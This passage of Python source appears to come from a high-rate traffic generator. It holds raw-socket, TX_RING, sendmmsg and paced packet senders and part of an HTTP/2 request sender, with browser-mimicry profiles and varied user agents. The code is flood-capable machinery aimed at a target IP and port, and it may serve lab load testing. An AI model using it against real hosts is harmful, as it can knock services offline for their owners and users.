        if not allow_fallback:
            if owns_socket and s is not None:
                s.close()
            _update_live(live_progress, int(count))
            _update_live(live_errors, int(count))
            return _stats(
                attempted=count,
                sent=0,
                errors=count,
                sender_path="L2_UNAVAILABLE",
                permission_error_count=0,
                fallback_count=fallback_count,
                sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "txring_unavailable",
                sender_backend_requested=requested_backend,
                sender_fallback_policy=fallback_policy,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=0,
                partial_send_retry_count=0,
            )

    # 1. Try C extension paths according to backend policy.
    if FAST_SENDER_AVAILABLE and try_txring and hasattr(fast_sender, "send_ring_optimized"):
        try:
            iface, gateway_mac = get_gateway_info(target_ip)
            if iface and gateway_mac:
                if not str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip():
                    loss_iface_hint = str(iface)
                    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
                if len(gateway_mac) != 6:
                    log_error(f"Invalid MAC address length: {len(gateway_mac)} (expected 6)")
                    _register_fallback("txring_invalid_gateway_mac")
                else:
                    log_info(f"[TX_RING] Starting zero-copy L2 send with MAC: {gateway_mac.hex()}")
                    if hasattr(fast_sender, "send_ring_optimized_ex"):
                        tx_result = fast_sender.send_ring_optimized_ex(
                            iface, packets_buffer, packet_size, count, gateway_mac
                        )
                        if isinstance(tx_result, dict):
                            sent = int(tx_result.get("sent", 0) or 0)
                            txring_flush_call_count += int(tx_result.get("txring_flush_call_count", 0) or 0)
                            txring_flush_error_count += int(tx_result.get("txring_flush_error_count", 0) or 0)
                            txring_flush_eagain_count += int(tx_result.get("txring_flush_eagain_count", 0) or 0)
                            txring_flush_enobufs_count += int(tx_result.get("txring_flush_enobufs_count", 0) or 0)
                            txring_flush_ebusy_count += int(tx_result.get("txring_flush_ebusy_count", 0) or 0)
                            txring_flush_other_errno_count += int(
                                tx_result.get("txring_flush_other_errno_count", 0) or 0
                            )
                            txring_flush_last_errno = int(tx_result.get("txring_flush_last_errno", 0) or 0)
                            txring_flush_last_errno_name = str(
                                tx_result.get("txring_flush_last_errno_name", "NONE") or "NONE"
                            )
                            txring_frame_wait_ns += int(tx_result.get("txring_frame_wait_ns", 0) or 0)
                            txring_poll_count += int(tx_result.get("txring_poll_count", 0) or 0)
                            _tx_flush_mode = str(tx_result.get("flush_mode", "") or "").strip()
                            if _tx_flush_mode:
                                if flush_mode in ("", "unknown"):
                                    flush_mode = _tx_flush_mode
                                elif flush_mode != _tx_flush_mode:
                                    flush_mode = "mixed"
                            txring_tp_packets += int(tx_result.get("txring_tp_packets", 0) or 0)
                            txring_tp_drops += int(tx_result.get("txring_tp_drops", 0) or 0)
                            txring_tp_freeze_q_cnt += int(tx_result.get("txring_tp_freeze_q_cnt", 0) or 0)
                            txring_packet_version = int(tx_result.get("txring_packet_version", 0) or 0)
                            txring_packet_version_name = str(
                                tx_result.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
                            )
                            txring_batch_target = int(tx_result.get("txring_batch_target", 0) or 0)
                            txring_backoff_ns += int(tx_result.get("txring_backoff_ns", 0) or 0)
                        else:
                            sent = int(tx_result or 0)
                    else:
                        sent = int(
                            fast_sender.send_ring_optimized(
                                iface, packets_buffer, packet_size, count, gateway_mac
                            )
                            or 0
                        )
                    log_info(f"Fast Sender (TX_RING L2) finished. Sent {sent} packets via {iface}.")
                    if owns_socket and s is not None:
                        s.close()
                    sent_total = int(sent or 0)
                    _update_live(live_progress, count)
                    _update_live(live_sent, sent_total)
                    _update_live(live_errors, max(0, count - sent_total))
                    out = _stats(
                        attempted=count,
                        sent=sent_total,
                        errors=max(0, count - sent_total),
                        bytes_sent_est=sent_total * packet_size,
                        sender_path="TX_RING_L2",
                        permission_error_count=0,
                        fallback_count=fallback_count,
                        sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "none",
                        sender_backend_requested=requested_backend,
                        sender_fallback_policy=fallback_policy,
                        buffer_copy_count=buffer_copy_count,
                        buffer_copy_bytes=buffer_copy_bytes,
                        eagain_retry_count=eagain_retry_count,
                        partial_send_retry_count=partial_send_retry_count,
                        buffer_reuse_hits=buffer_reuse_hits,
                        txring_flush_call_count=txring_flush_call_count,
                        txring_flush_error_count=txring_flush_error_count,
                        txring_flush_eagain_count=txring_flush_eagain_count,
                        txring_flush_enobufs_count=txring_flush_enobufs_count,
                        txring_flush_ebusy_count=txring_flush_ebusy_count,
                        txring_flush_other_errno_count=txring_flush_other_errno_count,
                        txring_flush_last_errno=txring_flush_last_errno,
                        txring_flush_last_errno_name=txring_flush_last_errno_name,
                        txring_frame_wait_ns=txring_frame_wait_ns,
                        txring_poll_count=txring_poll_count,
                        flush_mode=flush_mode,
                        txring_tp_packets=txring_tp_packets,
                        txring_tp_drops=txring_tp_drops,
                        txring_tp_freeze_q_cnt=txring_tp_freeze_q_cnt,
                        txring_packet_version=txring_packet_version,
                        txring_packet_version_name=txring_packet_version_name,
                        txring_batch_target=txring_batch_target,
                        txring_backoff_ns=txring_backoff_ns,
                    )
                    return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)
            else:
                _register_fallback("txring_gateway_not_found")
                if verbose:
                    log_error("Gateway MAC not found for TX_RING, falling back to L3.")
        except Exception as e:
            _register_fallback("txring_error")
            if verbose:
                log_error(f"TX_RING failed, falling back to L3: {e}")
    elif try_txring and requested_backend == "txring":
        _register_fallback("txring_unavailable")

    if requested_backend == "auto" and (not allow_fallback) and fallback_count > 0:
        if owns_socket and s is not None:
            s.close()
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="AUTO_PRIMARY_FAILED",
            permission_error_count=0,
            fallback_count=max(1, fallback_count),
            sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "auto_primary_failed",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=eagain_retry_count,
            partial_send_retry_count=partial_send_retry_count,
            buffer_reuse_hits=buffer_reuse_hits,
        )

    if bool(force_l2) or requested_backend == "txring":
        if not allow_fallback:
            if owns_socket and s is not None:
                s.close()
            _update_live(live_progress, int(count))
            _update_live(live_errors, int(count))
            return _stats(
                attempted=count,
                sent=0,
                errors=count,
                sender_path="L2_UNAVAILABLE",
                permission_error_count=0,
                fallback_count=max(1, fallback_count),
                sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "l2_unavailable",
                sender_backend_requested=requested_backend,
                sender_fallback_policy=fallback_policy,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=eagain_retry_count,
                partial_send_retry_count=partial_send_retry_count,
                buffer_reuse_hits=buffer_reuse_hits,
            )
        try_c_ext_l3 = True
        try_python = True

    # 1.b Try standard sendmmsg C extension (L3)
    if FAST_SENDER_AVAILABLE and try_c_ext_l3 and hasattr(fast_sender, "send_optimized"):
        try:
            cext_result = fast_sender.send_optimized(
                s.fileno(), packets_buffer, target_ip, target_port, packet_size, count
            )
            if isinstance(cext_result, dict):
                sent = int(cext_result.get("sent", 0) or 0)
                eagain_retry_count += int(cext_result.get("eagain_retry_count", 0) or 0)
                partial_send_retry_count += int(cext_result.get("partial_send_retry_count", 0) or 0)
            else:
                sent = int(cext_result or 0)
            log_info(f"Fast Sender (C Ext L3) finished. Sent {sent} packets.")
            if owns_socket and s is not None:
                s.close()
            sent_total = sent
            _update_live(live_progress, count)
            _update_live(live_sent, sent_total)
            _update_live(live_errors, max(0, count - sent_total))
            out = _stats(
                attempted=count,
                sent=sent_total,
                errors=max(0, count - sent_total),
                bytes_sent_est=sent_total * packet_size,
                sender_path="C_EXT_L3",
                permission_error_count=0,
                fallback_count=fallback_count,
                sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "none",
                sender_backend_requested=requested_backend,
                sender_fallback_policy=fallback_policy,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=eagain_retry_count,
                partial_send_retry_count=partial_send_retry_count,
                buffer_reuse_hits=buffer_reuse_hits,
            )
            return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)
        except Exception as e:
            _register_fallback("c_ext_l3_error")
            log_error(f"Fast Sender failed, falling back to Python: {e}")
    elif try_c_ext_l3 and requested_backend == "c_ext_l3":
        _register_fallback("c_ext_l3_unavailable")
        if not allow_fallback:
            if owns_socket and s is not None:
                s.close()
            _update_live(live_progress, int(count))
            _update_live(live_errors, int(count))
            return _stats(
                attempted=count,
                sent=0,
                errors=count,
                sender_path="C_EXT_UNAVAILABLE",
                permission_error_count=0,
                fallback_count=max(1, fallback_count),
                sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "c_ext_l3_unavailable",
                sender_backend_requested=requested_backend,
                sender_fallback_policy=fallback_policy,
                buffer_copy_count=buffer_copy_count,
                buffer_copy_bytes=buffer_copy_bytes,
                eagain_retry_count=eagain_retry_count,
                partial_send_retry_count=partial_send_retry_count,
                buffer_reuse_hits=buffer_reuse_hits,
            )

    if not try_python:
        _register_fallback("python_sender_disabled")
        if owns_socket and s is not None:
            s.close()
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="PYTHON_DISABLED",
            permission_error_count=permission_error_count,
            fallback_count=max(1, fallback_count),
            sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "python_sender_disabled",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=eagain_retry_count,
            partial_send_retry_count=partial_send_retry_count,
            buffer_reuse_hits=buffer_reuse_hits,
        )

    try:
        # Create memoryview to avoid copying
        mv = memoryview(packets_buffer)
        
        # Prepare batches for sendmmsg (Linux only)
        # Python's sendmmsg takes an iterable of (data, ancdata)
        # We can send in batches of e.g. 512 packets
        BATCH_SIZE = 512
        address = (target_ip, target_port)
        
        total_sent = 0
        
        if hasattr(s, 'sendmmsg'):
            sender_path = "PYTHON_SENDMMSG"
            prebuilt_datagrams = None
            reuse_sendmmsg = str(os.environ.get("SAMURAI_SENDMMSG_REUSE", "1") or "1").strip().lower() not in {
                "0", "false", "no", "off"
            }
            try:
                max_reuse_count = int(os.environ.get("SAMURAI_SENDMMSG_REUSE_MAX", "131072") or 131072)
            except Exception:
                max_reuse_count = 131072
            if reuse_sendmmsg and 0 < count <= max_reuse_count:
                try:
                    packet_views = [mv[(idx * packet_size):((idx + 1) * packet_size)] for idx in range(count)]
                    prebuilt_datagrams = [(pkt_view, []) for pkt_view in packet_views]
                    buffer_reuse_hits += 1
                except Exception:
                    prebuilt_datagrams = None

            for i in range(0, count, BATCH_SIZE):
                batch_end = min(i + BATCH_SIZE, count)
                batch_count = batch_end - i

                if prebuilt_datagrams is not None:
                    datagrams = prebuilt_datagrams[i:batch_end]
                else:
                    datagrams = []
                    for j in range(batch_count):
                        idx = i + j
                        start = idx * packet_size
                        end = start + packet_size
                        datagrams.append((mv[start:end], []))

                batch_progress = 0
                batch_index = 0
                consecutive_eagain = 0
                while batch_index < batch_count:
                    pending = batch_count - batch_index
                    try:
                        sent_msgs = s.sendmmsg(datagrams[batch_index:], 0, address)
                        sent_msgs = int(sent_msgs or 0)
                        if sent_msgs <= 0:
                            # Defensive retry when kernel returns 0 without raising.
                            eagain_retry_count += 1
                            consecutive_eagain += 1
                            if consecutive_eagain >= 1024:
                                _update_live(live_errors, pending)
                                batch_progress += pending
                                batch_index = batch_count
                            continue

                        total_sent += sent_msgs
                        batch_index += sent_msgs
                        batch_progress += sent_msgs
                        _update_live(live_sent, sent_msgs)
                        consecutive_eagain = 0

                        if sent_msgs < pending:
                            partial_send_retry_count += 1
                    except PermissionError:
                        permission_error_count += 1
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count
                    except OSError as exc:
                        if exc.errno == errno.EINTR:
                            continue
                        if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                            eagain_retry_count += 1
                            consecutive_eagain += 1
                            if consecutive_eagain >= 1024:
                                _update_live(live_errors, pending)
                                batch_progress += pending
                                batch_index = batch_count
                            continue
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count
                    except Exception:
                        _update_live(live_errors, pending)
                        batch_progress += pending
                        batch_index = batch_count

                _update_live(live_progress, batch_progress)
                
                if verbose and total_sent % 10000 < BATCH_SIZE:
                     log_info(f"Sent {total_sent}/{count} raw packets (sendmmsg)...")
        else:
            sender_path = "PYTHON_SENDTO"
            for i in range(count):
                _update_live(live_progress, 1)
                start = i * packet_size
                end = start + packet_size
                try:
                    s.sendto(mv[start:end], address)
                    total_sent += 1
                    _update_live(live_sent, 1)
                except PermissionError:
                    permission_error_count += 1
                    _update_live(live_errors, 1)
                except Exception:
                    _update_live(live_errors, 1)
                if verbose and i % 10000 == 0:
                    log_info(f"Sent {i}/{count} raw packets...")
        sent_total = int(total_sent)

    except Exception as e:
        log_error(f"Error during raw socket sending: {e}")
        if verbose:
            traceback.print_exc()
    finally:
        if owns_socket and s is not None:
            s.close()
        if FAST_SENDER_AVAILABLE and hasattr(fast_sender, 'cleanup_ring'):
            fast_sender.cleanup_ring()
        log_info(f"Raw socket sender finished sending {count} packets.")
    out = _stats(
        attempted=count,
        sent=sent_total,
        errors=max(0, count - sent_total),
        bytes_sent_est=sent_total * packet_size,
        sender_path=sender_path,
        permission_error_count=permission_error_count,
        fallback_count=fallback_count,
        sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "none",
        sender_backend_requested=requested_backend,
        sender_fallback_policy=fallback_policy,
        buffer_copy_count=buffer_copy_count,
        buffer_copy_bytes=buffer_copy_bytes,
        eagain_retry_count=eagain_retry_count,
        partial_send_retry_count=partial_send_retry_count,
        buffer_reuse_hits=buffer_reuse_hits,
        txring_flush_call_count=txring_flush_call_count,
        txring_flush_error_count=txring_flush_error_count,
        txring_flush_eagain_count=txring_flush_eagain_count,
        txring_flush_enobufs_count=txring_flush_enobufs_count,
        txring_flush_ebusy_count=txring_flush_ebusy_count,
        txring_flush_other_errno_count=txring_flush_other_errno_count,
        txring_flush_last_errno=txring_flush_last_errno,
        txring_flush_last_errno_name=txring_flush_last_errno_name,
        txring_frame_wait_ns=txring_frame_wait_ns,
        txring_poll_count=txring_poll_count,
        flush_mode=flush_mode,
        txring_tp_packets=txring_tp_packets,
        txring_tp_drops=txring_tp_drops,
        txring_tp_freeze_q_cnt=txring_tp_freeze_q_cnt,
        txring_packet_version=txring_packet_version,
        txring_packet_version_name=txring_packet_version_name,
        txring_batch_target=txring_batch_target,
        txring_backoff_ns=txring_backoff_ns,
    )
    return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)


async def paced_raw_socket_sender(
    packets_buffer,
    target_ip,
    target_port,
    count,
    verbose,
    pacing_config=None,
    force_l2=False,
    live_sent=None,
    live_errors=None,
    live_progress=None,
    sender_backend=None,
    sender_fallback_policy=None,
    sender_context: Dict[str, Any] | None = None,
    xdp_enable: bool = False,
    xdp_interface: str | None = None,
    xdp_queue_id: int = 0,
):
    """
    Pacing-aware wrapper around raw packet sending.
    Supports live metrics by updating shared counters.
    """
    requested_backend = _resolve_sender_backend(sender_backend)
    if bool(xdp_enable) and requested_backend == "auto":
        requested_backend = "xdp"
    fallback_policy = _resolve_sender_fallback_policy(sender_fallback_policy)

    if requested_backend == "xdp":
        if pacing_config is not None and int(getattr(pacing_config, "pacing_mode", 0) or 0) != 0:
            log_warning("[Pacing] sender-backend=xdp selected; C pacing is bypassed for this path.")
        return await xdp_sender(
            packets_buffer=packets_buffer,
            target_ip=target_ip,
            target_port=target_port,
            count=count,
            verbose=verbose,
            interface=xdp_interface,
            queue_id=int(xdp_queue_id or 0),
            sender_fallback_policy=fallback_policy,
            fallback_backend="python",
            sender_context=sender_context,
        )

    # --- Fast path: no pacing requested → bypass ---
    if (
        pacing_config is None
        or pacing_config.pacing_mode == 0            # PacingMode.NONE
        or not PACING_ENGINE_AVAILABLE
    ):
        return await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=live_progress,
            force_l2=force_l2,
            sender_backend=requested_backend,
            sender_fallback_policy=fallback_policy,
            sender_context=sender_context,
            xdp_enable=xdp_enable,
            xdp_interface=xdp_interface,
            xdp_queue_id=xdp_queue_id,
        )

    packet_size = len(packets_buffer) // count if count > 0 else 0
    if packet_size == 0:
        log_error("[Pacing] Invalid packet buffer (size=0)")
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_fallback_reason="invalid_packet_buffer",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=0,
            buffer_copy_bytes=0,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
    packets_buffer, normalize_meta = _normalize_packets_buffer(
        packets_buffer,
        required_bytes=packet_size * count,
        pool_key="senders_pacing_tx",
        return_meta=True,
    )
    buffer_copy_count = int(normalize_meta.get("buffer_copy_count", 0) or 0)
    buffer_copy_bytes = int(normalize_meta.get("buffer_copy_bytes", 0) or 0)
    loss_iface_hint = _resolve_loss_iface(None)
    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
    progress_reported = 0
    fallback_count = 0
    fallback_reasons = []

    def _register_fallback(reason: str) -> None:
        nonlocal fallback_count
        fallback_count += 1
        r = str(reason or "").strip()
        if r and r not in fallback_reasons:
            fallback_reasons.append(r)

    log_info(
        f"[Pacing] C engine: mode={pacing_config.pacing_mode.name}, "
        f"rps={pacing_config.target_rps:.0f}, ipg={pacing_config.ipg_ns}ns, "
        f"burst={pacing_config.burst_size}, jitter={pacing_config.jitter_model.name} "
        f"±{pacing_config.jitter_pct*100:.0f}%"
    )

    # --- Try L2 (TX_RING) path first if backend allows it ---
    if FAST_SENDER_AVAILABLE and requested_backend in {"auto", "txring"}:
        try:
            iface, gateway_mac = get_gateway_info(target_ip)
            if iface and gateway_mac and len(gateway_mac) == 6:
                if not str(os.environ.get("SAMURAI_LOSS_IFACE", "") or "").strip():
                    loss_iface_hint = str(iface)
                    loss_before_snapshot = _take_loss_snapshot(loss_iface_hint)
                log_info(f"[Pacing] Using L2 paced sender on {iface}")
                loop = asyncio.get_running_loop()
                try:
                    if callable(reset_stats):
                        reset_stats()
                except Exception:
                    pass
                progress_budget = max(0, int(count) - int(progress_reported))
                try:
                    sent, progress_emitted = await _run_paced_send_with_live_progress(
                        lambda: paced_send_l2(
                            iface,
                            packets_buffer,
                            packet_size,
                            count,
                            gateway_mac,
                            config=pacing_config,
                        ),
                        pacing_config=pacing_config,
                        progress_budget=progress_budget,
                        live_progress=live_progress,
                    )
                    progress_reported += int(progress_emitted)
                except _PacedSendRuntimeError as exc:
                    progress_reported += int(exc.progress_emitted)
                    raise exc.cause
                # Log pacing statistics
                stats = get_stats()
                if stats:
                    log_info(f"[Pacing] L2 done: {sent:,} pkts, "
                             f"rate={stats.get('actual_rps',0):,.0f} pps, "
                             f"accuracy={stats.get('rate_accuracy_pct',0):.1f}%, "
                             f"jitter_p99={stats.get('jitter_p99_ns',0):,.0f}ns")
                    if verbose:
                        log_info(f"\n{format_stats(stats)}")
                cleanup_l2()
                progress_tail = max(0, int(count) - int(progress_reported))
                _update_live(live_progress, progress_tail)
                progress_reported += int(progress_tail)
                _update_live(live_sent, int(sent or 0))
                _update_live(live_errors, max(0, count - int(sent or 0)))
                
                out = _stats(
                    attempted=count,
                    sent=int(sent or 0),
                    errors=max(0, count - int(sent or 0)),
                    bytes_sent_est=int(sent or 0) * packet_size,
                    sender_path="PACED_L2",
                    fallback_count=fallback_count,
                    sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "none",
                    sender_backend_requested=requested_backend,
                    sender_fallback_policy=fallback_policy,
                    buffer_copy_count=buffer_copy_count,
                    buffer_copy_bytes=buffer_copy_bytes,
                    eagain_retry_count=0,
                    partial_send_retry_count=0,
                )
                if stats:
                    out = _apply_pacing_stats(out, stats)
                return _attach_loss_telemetry(
                    out, loss_before_snapshot, preferred_iface=loss_iface_hint
                )
            else:
                _register_fallback("paced_l2_gateway_not_found")
        except Exception as e:
            try:
                cleanup_l2()
            except Exception:
                pass
            _register_fallback("paced_l2_error")
            if verbose:
                log_error(f"[Pacing] L2 paced send failed, falling back to L3: {e}")

    if bool(force_l2) or (requested_backend == "txring" and fallback_policy == "fail"):
        _update_live(live_progress, int(count))
        _update_live(live_errors, int(count))
        return _stats(
            attempted=count,
            sent=0,
            errors=count,
            sender_path="L2_UNAVAILABLE",
            fallback_count=max(1, fallback_count),
            sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "l2_unavailable",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )

    if requested_backend == "python":
        _register_fallback("pacing_bypassed_for_python_backend")
        return await raw_socket_sender(
            packets_buffer,
            target_ip,
            target_port,
            count,
            verbose,
            live_sent=live_sent,
            live_errors=live_errors,
            live_progress=live_progress,
            force_l2=force_l2,
            sender_backend="python",
            sender_fallback_policy=fallback_policy,
            sender_context=sender_context,
            xdp_enable=xdp_enable,
            xdp_interface=xdp_interface,
            xdp_queue_id=xdp_queue_id,
        )

    # --- L3 (IPPROTO_RAW) path ---
    try:
        log_info(f"[Pacing] Using L3 paced sender")
        loop = asyncio.get_running_loop()
        try:
            if callable(reset_stats):
                reset_stats()
        except Exception:
            pass
        progress_budget = max(0, int(count) - int(progress_reported))
        try:
            sent, progress_emitted = await _run_paced_send_with_live_progress(
                lambda: paced_send(
                    packets_buffer,
                    target_ip,
                    target_port,
                    packet_size,
                    count,
                    config=pacing_config,
                ),
                pacing_config=pacing_config,
                progress_budget=progress_budget,
                live_progress=live_progress,
            )
            progress_reported += int(progress_emitted)
        except _PacedSendRuntimeError as exc:
            progress_reported += int(exc.progress_emitted)
            raise exc.cause
        # Log pacing statistics
        stats = get_stats()
        progress_tail = max(0, int(count) - int(progress_reported))
        _update_live(live_progress, progress_tail)
        progress_reported += int(progress_tail)
        _update_live(live_sent, int(sent or 0))
        _update_live(live_errors, max(0, count - int(sent or 0)))

        out = _stats(
            attempted=count,
            sent=int(sent or 0),
            errors=max(0, count - int(sent or 0)),
            bytes_sent_est=int(sent or 0) * packet_size,
            sender_path="PACED_L3",
            fallback_count=fallback_count,
            sender_fallback_reason=";".join(fallback_reasons) if fallback_reasons else "none",
            sender_backend_requested=requested_backend,
            sender_fallback_policy=fallback_policy,
            buffer_copy_count=buffer_copy_count,
            buffer_copy_bytes=buffer_copy_bytes,
            eagain_retry_count=0,
            partial_send_retry_count=0,
        )
        if stats:
            out = _apply_pacing_stats(out, stats)
        return _attach_loss_telemetry(out, loss_before_snapshot, preferred_iface=loss_iface_hint)
    except PermissionError:
        log_error("[Pacing] Raw socket requires root. Falling back to unpaced.")
        fallback_live_progress = None if progress_reported > 0 else live_progress
        out = await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
            force_l2=force_l2,
            sender_backend=requested_backend,
            sender_fallback_policy=fallback_policy,
            sender_context=sender_context,
            xdp_enable=xdp_enable,
            xdp_interface=xdp_interface,
            xdp_queue_id=xdp_queue_id,
        )
        if progress_reported > 0:
            _update_live(live_progress, max(0, int(count) - int(progress_reported)))
        return out
    except Exception as e:
        log_error(f"[Pacing] L3 paced send failed: {e}. Falling back to unpaced.")
        fallback_live_progress = None if progress_reported > 0 else live_progress
        out = await raw_socket_sender(
            packets_buffer, target_ip, target_port, count, verbose,
            live_sent=live_sent, live_errors=live_errors, live_progress=fallback_live_progress,
            force_l2=force_l2,
            sender_backend=requested_backend,
            sender_fallback_policy=fallback_policy,
            sender_context=sender_context,
            xdp_enable=xdp_enable,
            xdp_interface=xdp_interface,
            xdp_queue_id=xdp_queue_id,
        )
        if progress_reported > 0:
            _update_live(live_progress, max(0, int(count) - int(progress_reported)))
        return out

async def http2_sender(
    target_ip,
    target_port,
    count,
    concurrency,
    http_path,
    http_method,
    verbose,
    scheme="https",
    cookies=None,
    user_agent=None,
    ssl_context=None,
    h2_profile_name=None,
    h2_transport_name="auto",
    request_plan: "H2RequestPlan | None" = None,
    verify=True,
    http2_connections=1,
    http2_streams_per_conn=100,
    l7_http2_engine="python",
    l7_fallback_policy="allow",
    l7_capability_strict=False,
    lab_profile="off",
    live_sent=None,
    live_errors=None,
    live_progress=None,
):
    """
    Sends HTTP/2 requests using httpx, leveraging multiplexing.
    If request_plan is provided, method/path/user-agent are consumed per item.
    """
    base_url = f"{scheme}://{target_ip}:{target_port}"

    def _resolve_default_h2_path(path_value):
        if isinstance(path_value, (list, tuple)):
            for entry in path_value:
                candidate = str(entry or "").strip()
                if candidate:
                    return candidate
            return "/"
        candidate = str(path_value or "").strip()
        return candidate if candidate else "/"

    default_http_method = str(http_method or "GET").strip() or "GET"
    default_http_path = _resolve_default_h2_path(http_path)
    default_user_agent = str(user_agent or "").strip()
    planned_items = []
    if request_plan is not None:
        planned_items = list(getattr(request_plan, "items", []) or [])
    planned_methods = []
    planned_paths = []
    planned_user_agents = []
    if planned_items:
        for item in planned_items:
            planned_methods.append(str(getattr(item, "method", default_http_method) or default_http_method))
            planned_paths.append(str(getattr(item, "path", default_http_path) or default_http_path))
            planned_user_agents.append(str(getattr(item, "user_agent", "") or "").strip())
    dispatch_count = int(len(planned_items) if planned_items else count)
    if dispatch_count <= 0:
        return _stats(attempted=0, sent=0, errors=0)
    route = l7_dispatch.build_route_decision(
        L7RouteRequest(
            protocol="http2",
            l7_engine="python",
            protocol_engine=str(l7_http2_engine or "auto"),
            fallback_policy=str(l7_fallback_policy or "allow"),
            capability_strict=bool(l7_capability_strict),
            legacy_path_enable=True,
            lab_profile=str(lab_profile or "off"),
        )
    )
    c_fallback_reason = "none"
    if route.engine == "c_state":
        c_cfg = l7_c_adapter.make_config(
            target_ip=str(target_ip),
            target_port=int(target_port or 0),
            count=dispatch_count,
            concurrency=max(1, int(concurrency or 1)),
            mode="http2_stateful",
            extra={
                "scheme": str(scheme or "https"),
                "verify": bool(verify),
                "http_method": str(default_http_method),
                "http_path": str(default_http_path),
                "user_agent": str(default_user_agent),
                "h2_profile": str(h2_profile_name or "none"),
                "h2_transport": str(h2_transport_name or "auto"),
                "h2_connections": int(http2_connections or 1),
                "h2_streams_per_conn": int(http2_streams_per_conn or 100),
                "h2_request_plan_count": int(dispatch_count if planned_items else 0),
                "h2_request_plan_methods": planned_methods,
                "h2_request_plan_paths": planned_paths,
                "h2_request_plan_user_agents": [] if default_user_agent else planned_user_agents,
            },
        )
        c_res = await l7_c_adapter.run("http2", c_cfg)
        if l7_legacy.should_return_c_result(c_res, allow_python_fallback=route.allow_python_fallback):
            c_stats = _normalize_l7_output(
                c_res.as_stats(),
                attempted_default=dispatch_count,
                sender_path="C_STATE_H2",
                engine_path_used=route.l7_engine_path_used,
                fallback_reason=str(getattr(c_res, "sender_fallback_reason", "none") or "none"),
                route=route,
            )
            _update_live(live_progress, int(c_stats.get("attempted", dispatch_count) or 0))
            _update_live(live_sent, int(c_stats.get("sent", 0) or 0))
            _update_live(live_errors, int(c_stats.get("errors", 0) or 0))
            return _stats(**c_stats)
        c_fallback_reason = str(getattr(c_res, "sender_fallback_reason", "none") or "none")
        log_warning(
            "L7 c_state HTTP/2 engine unavailable/failed; "
            f"Python HTTP/2 path fallback enabled (reason={c_fallback_reason})."
        )

    if not HTTPX_AVAILABLE:
        log_error("HTTP/2 desteği için 'httpx[http2]' kütüphanesi yüklü değil.")
        return _stats(
            **_normalize_l7_output(
                {"attempted": dispatch_count, "sent": 0, "errors": dispatch_count, "sender_path": "PY_HTTP2"},
                attempted_default=dispatch_count,
                sender_path="PY_HTTP2",
                engine_path_used="PY_HTTP2",
                fallback_reason=c_fallback_reason,
                route=route,
            )
        )

    from . import h2_mimic

    h2_conn_count = max(1, int(http2_connections or 1))
    h2_stream_cap = max(1, int(http2_streams_per_conn or 1))
    max_dispatch_concurrency = max(1, min(int(concurrency or 1), h2_conn_count * h2_stream_cap))
    log_info(
        f"HTTP/2 sender initialized. Target: {base_url}, Count: {dispatch_count}, "
        f"Concurrency: {max_dispatch_concurrency}, Conn: {h2_conn_count}, "
        f"Streams/Conn: {h2_stream_cap}"
    )

    transport_name = str(h2_transport_name or "auto").strip().lower()
    if transport_name not in {"auto", "httpx", "hyper-h2"}:
        transport_name = "auto"
    profile_requested = bool(
        str(h2_profile_name or "").strip()
        and str(h2_profile_name).strip().lower() != "none"
    )
    profile_disabled = int(not profile_requested)
    scheme_name = str(scheme or "https").strip().lower()
    ssl_ctx_obj = ssl_context if hasattr(ssl_context, "wrap_socket") else None
    verify_tls = bool(verify)

    resolved_profile = None
    try:
        resolved_profile = h2_mimic.resolve_h2_profile(h2_profile_name)
    except Exception as exc:
        log_error(f"HTTP/2 profile resolve failed: {exc}")
        _update_live(live_progress, dispatch_count)
        _update_live(live_errors, dispatch_count)
        return _stats(
            **_normalize_l7_output(
                {
                    "attempted": dispatch_count,
                    "sent": 0,
                    "errors": dispatch_count,
                    "h2_profile_requested": int(profile_requested),
                    "h2_profile_applied": 0,
                    "h2_profile_disabled": profile_disabled,
                    "h2_profile_apply_failed": int(profile_requested),
